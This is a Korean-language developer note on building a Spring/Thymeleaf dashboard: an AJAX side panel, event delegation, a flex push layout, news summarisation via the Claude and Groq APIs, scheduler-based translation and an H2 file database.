사이드바 메뉴 클릭 시 전체 페이지를 교체(`/main/list?type=TRADE_LOG`)하면 대시보드 컨텍스트(차트, 워치리스트)가 사라진다. 우측에서 패널이 밀려 들어오는 방식은 메인 콘텐츠를 유지하면서 게시판을 오버레이 없이 옆에 붙인다.

### Thymeleaf 프래그먼트 부분 응답 (AJAX)

```
GET /panel/board?type=TRADE_LOG  →  fragments/panel-board :: board  (HTML 조각만 반환)
GET /panel/post/{id}             →  fragments/panel-detail :: detail
```

컨트롤러에서 `return "fragments/panel-board :: board"` 처럼 `파일::프래그먼트명` 형식으로 반환하면 Thymeleaf가 해당 `th:fragment`만 렌더링한다. 전체 페이지가 아닌 HTML 조각이 응답으로 오고, JS `fetch()`가 받아서 `innerHTML`에 주입한다.

### 이벤트 위임(Event Delegation)으로 동적 콘텐츠 클릭 처리

패널 내부는 `fetch()`로 교체되므로 직접 이벤트 리스너를 붙이면 교체 후 사라진다. `document.addEventListener('click', ...)` 로 상위에서 잡고, `e.target.closest('[data-panel-post]')` 처럼 data 속성으로 의도한 클릭만 걸러낸다. 동적 DOM에서 표준 패턴이다.

### CSS flex push 레이아웃

```css
.app-shell  { display: flex; }
.app-main   { flex: 1; min-width: 0; }          /* 남은 공간 모두 차지, 줄어들 수 있음 */
.app-panel  { width: 0; overflow: hidden;
              transition: width 0.25s ease; }    /* 닫힘 상태 */
.app-panel.open { width: 400px; }               /* 열림 상태 */
```

`position: fixed/absolute` 없이 flex 흐름 안에서 너비가 늘어나면 `app-main`이 자동으로 압축된다. `overflow: hidden`으로 `width:0` 상태에서 내부 콘텐츠를 숨기고, `transition`으로 부드러운 슬라이드 효과를 낸다.

---

## Phase 4-C — 뉴스 내부 상세보기 + AI 한국어 요약

### 외부 링크 대신 내부 패널 탐색

뉴스 카드를 `<a href="..." target="_blank">` 대신 `data-news-id` 속성을 가진 `<div>`로 변경하고, 이벤트 위임으로 `loadNewsDetail(id)`를 호출한다. 패널 내 페이지 전환이므로 브라우저 탭이 열리지 않고 패널 body만 교체된다.

```html
<!-- 변경 전 -->
<a th:href="${article.url}" target="_blank">...</a>

<!-- 변경 후 -->
<div th:attr="data-news-id=${article.id}" style="cursor:pointer;">...</div>
```

### Anthropic Claude API 연동 (RestClient)

`ClaudeClient` 서비스가 RSS 수집 직후 각 기사의 제목+요약을 Claude Haiku에 보내 한국어 두괄식 요약을 생성한다.

- **Why RestClient?** Spring 6+에서 `RestTemplate`을 대체하는 동기 HTTP 클라이언트. `WebClient`보다 코드가 간결하고 reactive 의존성이 없다.
- **Graceful degradation:** `@Value("${anthropic.api.key:}")` — 환경변수 미설정 시 빈 문자열이 주입되어 API 호출을 건너뛴다. 서버는 정상 동작하고 `koreanSummary`는 null로 저장된다.
- **두괄식:** 가장 중요한 결론을 먼저 서술하는 글쓰기 방식. 프롬프트에 명시하여 AI 출력 형식을 유도한다.

### 뉴스 상세 화면 구성

```
[AI 한국어 요약] ← teal 좌측 보더 카드, 두괄식
[원문 영어 요약]
[원문 보기 버튼] ← 외부 링크 (새 탭)
```

`koreanSummary`가 null이면 AI 요약 카드를 렌더링하지 않아 미번역 기사도 깔끔하게 표시된다.

---

## Phase 4-D — 번역 비동기 분리 + H2 파일 DB

### 동기 처리의 문제점

RSS 수집 루프 안에서 번역 API를 직접 호출하면 기사 수 × 딜레이만큼 서버 시작이 지연된다. 특히 in-memory DB는 재시작 시 데이터가 초기화되므로 매번 전체 번역을 반복하게 된다.

### 해결: 스케줄러 분리

```
fetchAllFeeds()       — 5초 후 실행, 10분마다 반복 → 저장만 (빠름)
translatePending()    — 15초 후 실행, 1분마다 반복 → 미번역 5건씩 처리
```

- RSS 수집이 즉시 완료되어 서버 시작 직후 뉴스 목록 사용 가능
- 번역은 백그라운드에서 점진적으로 채워짐
- 번역 실패 시 `koreanSummary = ""`(빈 문자열)로 마킹 → 무한 재시도 방지

### H2 파일 DB

```properties
# in-memory (재시작 시 초기화)
spring.datasource.url=jdbc:h2:mem:testdb

# 파일 (재시작 후에도 데이터 유지)
spring.datasource.url=jdbc:h2:file:./data/testdb
```

파일 DB로 전환하면 이미 번역된 기사는 `existsByUrl()` 체크로 건너뛰어 재번역이 발생하지 않는다. 스키마 변경 시 `data/` 디렉토리를 삭제하고 재시작하면 된다.

### Groq API (무료 대체제)

Anthropic API 크레딧 부족, Gemini 무료 할당량 문제 대안으로 채택.
- 완전 무료, 신용카드 불필요
- OpenAI 호환 엔드포인트 (`/openai/v1/chat/completions`)
- 모델: `llama-3.1-8b-instant`, 분당 30회 제한
- API 키: `gsk_...` 형태 (console.groq.com 발급)
